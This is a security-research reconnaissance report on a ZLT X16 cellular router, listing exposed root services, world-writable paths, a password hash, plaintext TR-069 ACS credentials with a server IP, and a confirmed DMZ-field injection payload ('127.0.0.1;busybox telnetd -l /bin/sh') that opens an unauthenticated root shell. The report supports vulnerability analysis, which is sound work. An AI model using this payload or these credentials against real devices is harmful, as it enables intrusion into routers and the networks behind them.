# ZLT X16 — reconnaissance evidence (read-only)

Collected 2026-10-26 over SSH (`zlt-x16-root`). Device: SDX65 / SIMCom SIM8260E,
firmware `1.09.39.10`, config `X16-OMN247-4.00`. Everything below is observed on
the device; nothing here was inferred from the internet.

This file is the input for the vulnerability analysis. Raw dumps:
`raw-recon-1.txt`, `raw-recon-2.txt`.

---

## 1. Listening services

```
tcp  0.0.0.0:53        dnsmasq        (also udp, and udp 67 DHCP)
tcp  0.0.0.0:22        dropbear       <- added by us
tcp  :::22             dropbear
tcp  :::23             busybox telnetd -l /bin/sh   <- no authentication at all
tcp  :::80             mini_httpd (as ROOT)
tcp  :::443            mini_httpd (as ROOT, fixed cert /bin/mini_httpd.pem)
tcp  :::8080           busybox httpd (as ROOT, QManager)
tcp  192.168.3.1:7777  qmi_ip_multiclient
udp  192.168.3.1:7755  qmi_ip_multiclient
```

Firewall (`INPUT` policy ACCEPT) only explicitly drops tcp 22/80/443 on
`rmnet_data0` (in both `iptables` and `ip6tables`). **There is no rule for 8080**,
so it is reachable from the cellular WAN.

## 2. Local UNIX sockets

`/tmp/.sockmsg/*` (root:root, `srwxr-xr-x`) — control sockets for `dialer`,
`atcmd_daemon`, `firewalltool`, `configtools`, `lan_mgr`, `vpn_mgr`,
`tz_sms_mgr`, `ledctrl_daemon`, `http_cgi`, `upgrade`, `fota`, …
`/tmp/.tmpsock/atcmd` (root:root, `srwxr-xr-x`).

Not world-writable, so a non-root user cannot connect today.

## 3. SUID / permissions

```
/bin/busybox.suid          setuid root
/bin/su -> /bin/su.shadow  (su.shadow is 0755, NOT setuid)
/etc/shadow                0400 root:root
/data/root, /data/root-ssh 0700 root:root   (ours)
/etc/qmanager              drwxrwxrwx  <- WORLD-WRITABLE
/data/etc/qmanager         world-writable
/data/mifi                 drwxrwxrwx  <- WORLD-WRITABLE
/data/coredump             drw-rw-rw-  <- WORLD-WRITABLE
/data/qwes                 drwxrwxr-x  (group-writable)
/data/www                  www-data:www-data 0775
```

## 4. Root-executed code that lives on writable volumes

```
/etc/systemd/system/TZApp.service            ExecStart=/etc/initscripts/StartTZApp start
/etc/systemd/system/zlt-wan-fix.service      ExecStart=/data/zlt-wan-fix/zlt-wan-fix.sh
/etc/systemd/system/qmanager-httpd.service   ExecStart=/data/qmanager/bin/qm_serve.sh start
/etc/systemd/system/qmanager-ping.service    ExecStart=/data/qmanager/bin/qmanager_ping
/etc/systemd/system/qmanager-poller.service  ExecStart=/data/qmanager/bin/qmanager_poller
/etc/systemd/system/qmanager-traffic.service ExecStart=/data/qmanager/bin/qmanager_traffic.sh
/etc/systemd/system/start_stop_ipa_fws.service
```

`qmanager-poller` additionally runs, as root, a `sh -c` loop invoking
`/bin/atcmd "AT+CGMM"`.

`qm_serve.sh` states in its own header:

> httpd runs as ROOT (no -u): CGI helpers write /etc/qmanager and must reach the
> modem through /bin/atcmd. /data/qmanager/bin/sudo is a passthrough shim.

## 5. Web surfaces

| Surface | Detail |
|---|---|
| `mini_httpd` :80/:443 | `user=root`, `cgipat=cgi-bin/*`, `dir=/tzwww`, fixed TLS cert |
| `busybox httpd` :8080 | `-p 8080 -h /data/qmanager/www`, **no `-c` auth file**, runs as root |
| `/data/lighttpd.conf` | stale/unused: references `/WEBSERVER/www/`, `auth.backend=plain`, `auth.backend.plain.userfile=/data/www/lighttpd.user`, `mod_cgi`, `cgi.assign = ( "" => "" )` |

`/data/www/lighttpd.user` contains:

```
admin:$6$28780376880137ae$sy2ToGy3NjYEPTfOPZT7/IMEr0MN9F6gZbrt6e0881usmBPFGAKy1sYGNNz6GMcfqcx2aRJn95qm/551AIqNk/
```

`/etc/qmanager/auth.json` is `0600 root`; `/etc/qmanager/qmanager.conf` is `0644`.

## 6. Credentials and secrets stored in plaintext (mdlcfg)

```
SYS_USER_LOGIN_NAME    admin
SYS_USER_LOGIN_PWD     admin
SYS_SENIOR_LOGIN_PWD   admin
SYS_SUPER_LOGIN_NAME   superadmin
SYS_SUPER_LOGIN_PWD    <super-admin-pw-redacted>          <- fleet-wide, publicly discussed
USR_TR069_ACS_USERNAME acsadmin
USR_TR069_ACS_PWD      N@wras7547        <- plaintext ACS credential
USR_TR069_SERVER_IP    183.6.18.43
USR_TR069_SERVER_PORT  12345
USR_TR069_PERIODIC_SW  1
USR_ODU_WLAN2G_PASSWORD_0..3  <wlan-psk-redacted>   <- same default on all four SSIDs
USR_ESIM_SERVER_URL    1$esim.wo.com.cn$$1.3.6.1.4.1.47814.101.8
```

`mdlcfg -e` prints all of the above to any process that can run it.

## 7. Known injection already confirmed

`/productinfo/tzcfg/iptables/iptables_dmz_function`:

```json
{"enabled":"1","ip":"127.0.0.1;busybox telnetd -l /bin/sh","cmd":172,"subcmd":6,
 "success":true,"method":"POST","sessionId":"bda24badbc70d8..."}
```

The DMZ `ip` field is interpolated into a root shell command.

## 8. State-changing modes / other config surfaces (from the RequestCmd enum)

`SYS_UPDATE` (5), `SYS_REBOOT` (6), `CONFIG_UPDATE` (184), `CONFIG_LOADER` (199),
`UPGRADE_IMMEDIATELY` (239), `SYS_AUTO_UPGRADE` (240), `ADB_SWITCH` (237),
`MODEM_LOG_SWITCH` (236), `REMOTE_PACKET_CAPTURE` (245), `AT_CMD` (45) /
`MODEM_CMD` (51), `LTE_AT` (45), `CHANGE_USERNAME` (98), `CHANGE_PASSWD` (102),
`OPEN_RANDOM_PIN` (244), `WPS_PIN_CODE` (243), `REMOTE_UPGRADE` (198).

`/bin/tz_upgrade_client -i bridge0` exists and is started by
`start_upgrade_client.sh` when invoked.
